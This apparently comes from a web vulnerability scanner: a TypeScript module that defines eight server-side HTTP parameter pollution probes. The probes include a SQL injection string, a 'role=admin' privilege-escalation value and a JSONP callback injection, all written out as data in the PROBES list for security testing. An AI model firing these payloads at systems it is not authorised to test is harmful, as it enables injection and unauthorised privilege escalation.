import type { PayloadVariant } from '../types';

export const META = {
  id: 'http-parameter-pollution-server',
  family: 'cache-poisoning' as const,
  name: 'HTTP Parameter Pollution (Server-Side)',
  description: 'Probes server-side HPP to detect how the backend handles duplicate parameters vs the frontend.',
  defaultRisk: 'none' as const,
  insertionPointKinds: ['query', 'body'],
};

const PROBES = [
  { value: '?a=1&a=2', intent: 'Duplicate param — server may pick first, last, or concatenate depending on framework', signals: ['hpp-accepted'] },
  { value: '?a[]=1&a[]=2', intent: 'Array-style duplicate params — server-side merging behavior differs from client', signals: ['hpp-accepted'] },
  { value: '?a=1%26a=2', intent: 'URL-encoded ampersand — bypasses server-side single-param extraction', signals: ['hpp-accepted'] },
  { value: '?a=1;a=2', intent: 'Semicolon-separated params — server parser may split on semicolons', signals: ['hpp-accepted'] },
  { value: '?a=safe&a=\' OR 1=1--', intent: 'HPP SQL injection in second duplicate param value', signals: ['hpp-accepted', 'sql-injection'] },
  { value: '?role=user&role=admin', intent: 'Server-side HPP privilege escalation via last-wins param parsing', signals: ['hpp-accepted', 'privilege-escalation'] },
  { value: '?id=1&id=2&id=3', intent: 'Three duplicate params — tests array vs scalar handling server-side', signals: ['hpp-accepted'] },
  { value: '?callback=legit&callback=evil', intent: 'JSONP callback HPP — second value may reach response without sanitization', signals: ['hpp-accepted'] },
];

export function variants(): PayloadVariant[] {
  return PROBES.map((p, i) => ({
    id: `hpp-server-${i + 1}`,
    family: 'cache-poisoning' as const,
    value: p.value,
    encoding: 'raw' as const,
    intent: p.intent,
    requiresOast: false,
    requiresBrowser: false,
    destructiveRisk: 'none' as const,
    expectedSignals: p.signals,
  }));
}
